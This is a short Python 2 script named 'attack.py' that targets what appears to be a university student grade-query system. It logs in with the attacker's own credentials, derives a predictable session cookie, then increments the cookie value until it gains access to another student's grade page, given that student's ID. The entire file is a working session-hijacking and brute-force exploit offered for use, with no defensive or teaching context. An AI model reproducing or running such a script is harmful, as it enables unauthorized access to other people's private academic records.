import urllib
import urllib2
import cookielib
import sys
def getcookie(studentid):
    url='http://具体查询域名或者ip/pls/wwwbks/bks_login2.login'
    data={'stuid':'这里换成你自己的学号','pwd':'换成你自己的密码'}
    data=urllib.urlencode(data)
    req=urllib2.Request(url,data)
    cookie=cookielib.CookieJar()
    handler=urllib2.HTTPCookieProcessor(cookie)
    opener=urllib2.build_opener(handler)
    response=opener.open(req)
    cookie=str(cookie).split('=')[1].split(' for')[0]
    cookie=studentid+cookie[9:-4]+'0000'
    return cookie
def tester(cookie):
    url="http://具体查询域名或者ip/pls/wwwbks/bkscjcx.curscopre"
    req=urllib2.Request(url)
    req.add_header('Cookie','ACCOUNT='+cookie)
    response=urllib2.urlopen(req)
    check=response.read()
    return check
def checker(check):
    if (check.find('td_biaogexian')>0):
        print 'success'
        return 1
    else:
        return 0
def fuzz(account):
    cookie=getcookie(account)
    while(checker(tester(cookie))!=1):
        cookie=str(long(cookie)+1)
    print cookie

if __name__ == "__main__":
    print '''  ____ ___      _ _____      _ _       
 / ___/ _ \  __| |___ / _ __/ (_)_   _ 
| |  | | | |/ _` | |_ \| '__| | | | | |
| |__| |_| | (_| |___) | |  | | | |_| |
 \____\___/ \__,_|____/|_|  |_|_|\__,_|
'''
    if len(sys.argv)<2:
        print 'usage: attack.py StudentID'
    else:
        newaccount=sys.argv[1]
        fuzz(newaccount)



